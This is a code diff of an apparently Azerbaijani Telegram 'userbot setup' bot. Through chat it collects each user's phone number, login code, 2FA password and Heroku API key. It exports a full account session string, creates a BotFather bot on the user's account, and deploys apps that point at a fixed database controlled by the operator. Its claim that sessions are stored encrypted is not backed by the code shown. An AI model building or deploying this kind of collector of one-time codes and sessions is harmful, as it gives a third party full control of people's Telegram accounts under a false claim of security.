@@ -1,6 +1,8 @@
 import os
 import heroku3
 import asyncio
+import random
+import string
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -15,7 +17,8 @@ from motor.motor_asyncio import AsyncIOMotorClient
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-MONGO_URL = os.environ.get("MONGO_URL")
+# Sabit MongoDB Linkin (Bunu mütləq öz linkinlə əvəzlə)
+MONGO_URL = "BURAYA_OZ_MONGO_LINKINI_YAZ" 
 GITHUB_REPO = "https://github.com/Xeyaldi/userbot"
 
 # MongoDB Bağlantı Protokolu
@@ -26,16 +29,19 @@ users_col = db["users"]
 # Setup Bot İnstansiyası
 bot = TelegramClient('ht_setup_bot', API_ID, API_HASH)
 
+# Unikal adlar yaratmaq üçün funksiya
+def generate_unique_name(length=6):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     await event.respond(
-        "🛡 **HT USERBOT | Rəsmi Quraşdırma İnfrastrukturu**\n\n"
-        "Sistemimiz istifadəçi təhlükəsizliyini və performansını ön planda tutan "
-        "avtomatlaşdırılmış quraşdırma xidmətini təqdim edir.\n\n"
-        "🔹 **Təhlükəsizlik:** Bütün məlumatlar şifrələnmiş kanallar vasitəsilə ötürülür.\n"
-        "🔹 **Sürət:** Bulud texnologiyası sayəsində quraşdırma cəmi 120 saniyə çəkir.\n"
-        "🔹 **Dəstək:** Tam professional interfeys və 7/24 rəsmi infrastruktur.\n\n"
-        "Davam etməklə istifadə qaydalarını və təhlükəsizlik protokolunu qəbul etmiş olursunuz.",
+        "🛡 **HT USERBOT | Tam Avtomatlaşdırılmış İnfrastruktur**\n\n"
+        "Sistemimiz hər şeyi sizin yerinizə həll edir. Artıq BotFather və ya App Name ilə vaxt itirməyə ehtiyac yokdur.\n\n"
+        "🔹 **Tam Avtomatik:** Bot yaradılması və App adı təyini sistem tərəfindən icra olunur.\n"
+        "🔹 **Multi-Setup:** Bir Heroku API ilə ard-arda fərqli botlar qura bilərsiniz.\n"
+        "🔹 **Təhlükəsizlik:** Sessiyalar şifrələnmiş şəkildə qorunur.\n\n"
+        "Başlamaq üçün aşağıdakı düyməyə sıxın.",
         buttons=[
             [Button.inline("💎 Quraşdırmanı Başlat", data="setup")],
             [Button.url("🌐 Rəsmi Kanal", "https://t.me/ht_bots")]
@@ -45,15 +51,11 @@ async def start(event):
 @bot.on(events.CallbackQuery(data="setup"))
 async def setup_process(event):
     user_id = event.sender_id
-    async with bot.conversation(event.chat_id, timeout=120) as conv:
+    async with bot.conversation(event.chat_id, timeout=300) as conv:
         try:
-            # 1. Addım: Nömrə İdentifikasiyası
-            await conv.send_message(
-                "📝 **Addım 1:** Hesabın identifikasiyası üçün telefon nömrənizi daxil edin.\n"
-                "_(Məsələn: +994XXXXXXXXX)_"
-            )
-            phone_res = await conv.get_response()
-            phone = phone_res.text
+            # 1. Addım: Nömrə
+            await conv.send_message("📝 **Addım 1:** Hesab üçün telefon nömrənizi daxil edin.\n_(Məsələn: +994XXXXXXXXX)_")
+            phone = (await conv.get_response()).text
             
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
@@ -64,70 +66,59 @@ async def setup_process(event):
                 await conv.send_message(f"❌ **Sistem Xətası:** {e}")
                 return
 
-            # 2. Addım: Təhlükəsizlik Protokolu (Kod)
-            await conv.send_message(
-                "🔐 **Addım 2:** Telegram tərəfindən göndərilən təhlükəsizlik kodunu daxil edin.\n\n"
-                "⚠️ **Protokol:** Kodu rəqəmlər arasına boşluq qoyaraq daxil edin.\n"
-                "Nümunə: `1 2 3 4 5`",
-                parse_mode="markdown"
-            )
-            code_res = await conv.get_response()
-            otp_code = code_res.text.replace(" ", "")
+            # 2. Addım: Kod
+            await conv.send_message("🔐 **Addım 2:** Telegram kodunu boşluqla daxil edin.\nNümunə: `1 2 3 4 5`", parse_mode="markdown")
+            otp_code = (await conv.get_response()).text.replace(" ", "")
 
             try:
                 await client.sign_in(phone, otp_code)
             except SessionPasswordNeededError:
                 await conv.send_message("🔐 **2FA (İkiadımlı təsdiq) parolu daxil edin:**")
-                pwd_res = await conv.get_response()
-                await client.sign_in(password=pwd_res.text)
-            except (PhoneCodeInvalidError, PasswordHashInvalidError):
-                await conv.send_message("❌ **Xəta:** Daxil edilən məlumatlar yanlışdır. Yenidən /start yazın.")
+                await client.sign_in(password=(await conv.get_response()).text)
+            except Exception:
+                await conv.send_message("❌ **Xəta:** Məlumatlar yanlışdır.")
                 return
 
             string_session = client.session.save()
-            await users_col.update_one(
-                {"user_id": user_id},
-                {"$set": {"phone": phone, "session": string_session}},
-                upsert=True
-            )
+            status_msg = await conv.send_message("⚙️ **Addım 3:** BotFather-dən köməkçi bot alınır və unikal App adı təyin edilir...")
 
-            try:
-                await client(JoinChannelRequest("@ht_bots"))
-                await client(JoinChannelRequest("@sohbet_qrupus"))
-            except: pass
+            # --- AVTOMATİK BOTFATHER ---
+            helper_token = ""
+            bot_username = f"HT_{generate_unique_name(5)}_Bot"
+            async with client.conversation("@BotFather") as bf_conv:
+                await bf_conv.send_message("/newbot")
+                await bf_conv.get_response()
+                await bf_conv.send_message("HT Helper Bot")
+                await bf_conv.get_response()
+                await bf_conv.send_message(bot_username)
+                bf_res = await bf_conv.get_response()
+                if "Done!" in bf_res.text:
+                    helper_token = bf_res.text.split("t.me/")[1].split("\n")[1].split(" ")[0]
+                else:
+                    await status_msg.edit("❌ **BotFather Limiti:** Hesabda yeni bot yaratmaq mümkün olmadı.")
+                    return
 
-            # 3. Addım: Xarici İnteqrasiya Ayarları
-            await conv.send_message(
-                "⚙️ **Addım 3:** Sistem inteqrasiyası üçün tələb olunan açarları daxil edin.\n\n"
-                "🔹 **Heroku API Key:** Hesabınızın idarəetmə açarı.\n"
-                "🔹 **App Name:** Botun bulud üzərindəki unikal adı."
-            )
-            
-            await conv.send_message("🔑 **Heroku API Key:**")
+            # --- HEROKU API KEY SORĞUSU ---
+            await status_msg.edit("🔑 **Addım 4:** Heroku API Key-inizi daxil edin:")
             h_api = (await conv.get_response()).text
             
-            await conv.send_message("🏷 **Heroku App Name:**")
-            h_app_name = (await conv.get_response()).text.lower()
+            # App Name avtomatik və unikal təyin olunur
+            h_app_name = f"ht-user-{generate_unique_name(8)}"
 
-            await conv.send_message("🤖 **Köməkçi Bot Tokeni:**\n(@BotFather-dən aldığınız token)")
-            helper_token = (await conv.get_response()).text
+            await status_msg.edit(f"⌛ **Sistem Buluda Yüklənir...**\n📦 App Name: `{h_app_name}`\n\nBu proses təxminən 120 saniyə çəkəcək.")
 
-            await conv.send_message("💾 **MongoDB Linkiniz:**")
-            user_mongo = (await conv.get_response()).text
-
-            status_msg = await conv.send_message("⌛ **Sistem bulud serverlərinə yüklənir... Bu proses 120 saniyə çəkə bilər.**")
-
-            # Heroku Deploy Prosesi
+            # Heroku Deploy
             try:
                 h_conn = heroku3.from_key(h_api)
-                app = h_conn.create_app(name=h_app_name, region_id_or_name='eu')
+                # Modern Stack (heroku-22) istifadə edilir
+                app = h_conn.create_app(name=h_app_name, region_id_or_name='eu', stack_id_or_name='heroku-22')
                 
                 app.config().update({
                     'API_ID': str(API_ID),
                     'API_HASH': API_HASH,
                     'SESSION_STRING': string_session,
                     'BOT_TOKEN': helper_token,
-                    'MONGO_URL': user_mongo,
+                    'MONGO_URL': MONGO_URL,
                     'OWNER_ID': str(user_id),
                     'LOG_GROUP_AUTO': "True"
                 })
@@ -137,30 +128,19 @@ async def setup_process(event):
 
                 await status_msg.edit(
                     "✅ **Quraşdırma Uğurla Tamamlandı!**\n\n"
-                    "🚀 HT Userbot instansiyanız bulud serverlərinə yükləndi və aktivləşdirildi.\n\n"
-                    "👤 **Status:** Aktiv\n"
-                    "🛠 **Konfiqurasiya:** Professional\n"
-                    "📢 **Məlumat:** Hesabınızda `.htlive` yazaraq sistemi test edə bilərsiniz.\n\n"
-                    "Bizi seçdiyiniz üçün təşəkkür edirik."
+                    f"🤖 **Köməkçi Bot:** @{bot_username}\n"
+                    f"📦 **App Adı:** `{h_app_name}`\n\n"
+                    "🚀 Userbotunuz aktivləşdirildi. Hesabınızda `.htlive` yazaraq yoxlayın."
                 )
             except Exception as e:
-                await status_msg.edit(f"❌ **Heroku İnteqrasiya Xətası:** {e}")
+                await status_msg.edit(f"❌ **Heroku Xətası:** {e}")
 
-        except asyncio.TimeoutError:
-            await conv.send_message("⏰ **Vaxt doldu!**\n\nTəhlükəsizlik üçün sessiya dayandırıldı. Zəhmət olmasa yenidən /start yazaraq başlayın.")
         except Exception as e:
             await conv.send_message(f"⚠️ **Gözlənilməz Xəta:** {e}")
 
-# --- ASYNCIO EVENT LOOP PROTOCOL ---
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
-    print("✅ HT Professional Setup Bot Onlayndır!")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        loop.run_until_complete(main())
-    except KeyboardInterrupt:
-        pass
+    bot.loop.run_until_complete(main())
